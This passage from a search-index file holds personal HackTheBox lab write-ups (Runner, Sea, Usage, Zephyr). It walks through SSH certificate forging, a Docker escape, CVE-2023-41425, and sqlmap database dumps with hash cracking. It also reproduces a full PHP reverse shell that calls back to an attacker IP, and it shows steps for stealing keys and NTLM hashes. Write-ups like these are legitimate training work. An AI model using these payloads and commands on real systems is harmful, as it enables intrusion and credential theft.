file and <code>ssh_host_rsa_key</code> identity file: <pre><code>ssh -p 2222 -i ssh_host_rsa_key -o CertificateFile=ssh_host_support-cert.pub support@10.129.200.185\n</code></pre>  Find nothing in home directory, we go to <code>/etc/ssh</code> again:  In <code>auth_principals</code> we find 3 files for the principal name of each user. So we cat them:  We now generate a cert for <code>zzinter</code> user as well, same method as above just using the name <code>zzinter_temp</code> as principal: <pre><code>curl -s signserv.ssg.htb/v1/sign -d '{\"pubkey\": \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCfjF5gUlAUKAIn8YxitIk2A/qd30XXdIK91iLzUw7mVuCJe5MzPnllPCbK+wbE22SjVWoZ1cBKgMeAUaGCz/Z2FtQpecQ6B0cxwJVfgVu5mw5EIVLSUuVjiykddjLqjJ695es1ILT8f8gnXc9NCF4eCLlQ5xYVv//ZDwrjkg+C+9nTdBViaAWGeJgxMaQoLED2K1CxeibDshjKbCXxCjv9bxVQR+4yOcthOE3TR2jeSgJ6IN0h+Lwai/G2ZVImHzK+QpLWXED6PqnDjIs8lvTR9MPYaloyN6uzAjlHBmQXHfxKt5ZCDk4ytx5PIYrBNOqPUU7ZzoNbv1AQ6wzb9HqWtu13TWu4gQvN3BLtKXr/aw8mJ3jKLWPpK4ysp5x4EA7l6EsqwIbrZvf6Rc0TRDt+5ssCtOYhEUuqbMx5GvGh2j+uFqc9U5wvHyExp4Eck2g9pfzIZD+gF0WAuQNjzYi35ucEr8nMghoPYQNVkKUySHLFPn1DKtdFj95b+O2sXis= root@buildkitsandbox\", \"username\": \"zzinter_temp\", \"principals\": \"zzinter_temp\"}' -H \"Content-Type: application/json\" -H \"Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE\"\n</code></pre> Doing the same as above and <code>ssh</code> on port 2222 as <code>zzinter</code>: <pre><code>ssh -p 2222 -i ssh_host_rsa_key -o CertificateFile=ssh_host_zzinter-cert.pub zzinter@10.129.200.185\n</code></pre>  See another <code>user.txt</code>, but is not a valid flag. In <code>/opt</code> we see <code>sign_key.sh</code>  We can run it as root.</p>"}, {"location": "Write-Ups/Runner/", "title": "Runner", "text": "<p>Scan Find Webpage Look through page, nothing interesting subdomain search ffuf find teamcity searchsploit teamcity find exploit for used version run exploit log in to teamcity see ssh public key meaning we can maybe login, edited by john so most likely john run a backup extract backup, find database backup, go to users, extract data find out password hashes hashcat it, get password of matthew, try login, dont work, save for later maybe go through files find config/plugins something see ssh private key yoink the private key and ssh using the private key as matthew, then john cuz only saw two other users works, connected as john, user.txt great success run linpeas, look at a lot of shit, nothing really interesting find nginx sites-enabled add the new vhost to /etc/host go there login page, dont know try a bit remember matthew password, login, works google portainer, is interactive docker platform immediately ding docker escape try to understand the arch of portainer see we can create everything since we're admin find out the two images, teamcity is most likely the teamcity thing and ubuntu is where we need to be at try running both of them, yields nothing try to mount the root volume of both by creating a new volume type bind device / and o none, this should get us the root volume try it with ubuntu and mount it to /mnt/root go there, root.txt, great success</p>"}, {"location": "Write-Ups/Runner/#todo", "title": "TODO", "text": "<p>read more about docker, docker escapes, how they work with volumes and create them!</p>"}, {"location": "Write-Ups/Sea/", "title": "Sea", "text": "<p>First nmap scan: <pre><code>nmap --min-rate 1000 -T4 -A 10.129.208.143 -oN nmap\n</code></pre>  We do fuzzing: <pre><code>ffuf -u http://sea.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic\n</code></pre>  No SSRF/XSS possible, maybe filtered. Fuzzing on /themes/: <pre><code>ffuf -u http://sea.htb/themes/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic\n</code></pre>  301 on <code>bike</code>. Fuzz again   Is contents of README.md  Try CVE-2023-41425 https://github.com/prodigiousMind/CVE-2023-41425 Going through exploit, need to find loginURL first which is at: <pre><code>http://sea.htb/?page=loginURL\n</code></pre>  And we can modify the urlRev to our attack host to upload a custom reverse shell, instead of the provided one from the CVE (pentestmonkey). Execute exploit: <pre><code>python3 exploit.py \"http://sea.htb/?page=loginURL\" 10.10.14.62 7777\n</code></pre>  We send it via the <code>contact.php</code> to admin using website parameter. Wait a bit and we go to <pre><code>http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.62&amp;lport=7777\n</code></pre> And get a reverse shell on our listener:  Inside <code>/var/www/sea/data/database.js</code> we find a password:  Rewrite the hash to: <pre><code>$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q\n</code></pre> so that we can use hashcat: <pre><code>hashcat -m 3200 hash.txt rockyou.txt\n</code></pre>  With the password. Port 8080 is listening  We use ssh port forwarding: <pre><code>ssh -L 7878:localhost:8080 amay@sea.htb\n</code></pre> And we visit the page on attack host:  We login using <code>amay:mychemicalromance</code>.  Analyze with burp:  CMD injection:  </p>"}, {"location": "Write-Ups/Usage/", "title": "Usage", "text": "<p>Nmap scan:   Admin page at <code>admin.usage.htb</code> add to <code>/etc/hosts</code>  Trying the login form at admin page, identify long response time when trying SQL payloads.</p> <p>Trying <code>sqlmap</code>. doesn't work finally try it on forgot-password, and i get a blind sqli.  </p> <p>extracting the <code>--dbs</code>. <code>sqlmap -r req.txt -p email --level 3 --risk 3 --batch --dbs</code>  extract <code>usage_blog</code> <code>sqlmap -r req.txt -p email --level 3 --risk 3 --batch -D usage_blog --tables</code>  Interesting tables are admin_users and users. I dump them both: sqlmap -r req.txt --threads 10 --batch -D usage_blog -T admin_users --dump sqlmap -r req.txt --threads 10 --batch -D usage_blog -T users --dump  </p> <p>Cracking the hashes using hashcat   So it's most likely bcrypt blowfish   Meaning <code>admin:whatever1</code> and <code>raj@raj.com:xander</code>, <code>raj@usage.htb:xander</code></p> <p>Trying ssh first, doesn't work</p> <p>admin login at admin page works  https://flyd.uk/post/cve-2023-24249/</p> <p>  goes through so i write a php reverse shell and set up my listener  <pre><code>&lt;?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '10.10.14.22';\n$port = 7777;\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; sh -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n    $pid = pcntl_fork();\n\n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n\n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n$descriptorspec = array(\n   0 =&gt; array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 =&gt; array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 =&gt; array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?&gt;\n</code></pre></p> <p> Refreshing the page after sending payload with burpsuite. Hovering the download button to see page URL, go to it and reverse shell is triggered  upgrading to tty home directory has another user named xander </p> <p>getting user flag:  grabbing id_rsa from .ssh for ssh connection and add my personal key to authorized_keys</p> <p> unusual file .monitrc in dash directory  some password in there, try root ssh</p> <p>Copying over linpeas.sh <code>scp -i /home/kali/HTB/Usage/dash_id_rsa ./linpeas.sh dash@usage.htb:/home/dash/linpeas.sh</code></p> <p>Trying xander login with password su -l xander  also do ssh   and logging in on my machine using ssh </p> <p>bin uses 7zip 16.02 and has some options option 1 creates project backup at /var/backups/project.zip</p> <p>analyzing the binary file i also stumble across this /var/www/html /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- * and by reading its output it seems to really take /var/www/html/ files and runs them through 7za:  <code>-snl</code> stores symbolic links so i set the symbolic link to root's id_rsa private key in hopes it exists:  and run the bin  worked https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks copy private key and try to ssh as root  </p>"}, {"location": "Write-Ups/Zephyr/", "title": "Zephyr", "text": "<p>-&gt; https://github.com/deepzec/Bad-Pdf Upload malicious PDF steal NTLM hash Crack NTLM hash of user   \u00a7</p>"}, {"location": "Write-Ups/indexu/", "title": "HackTheBox", "text": ""}]}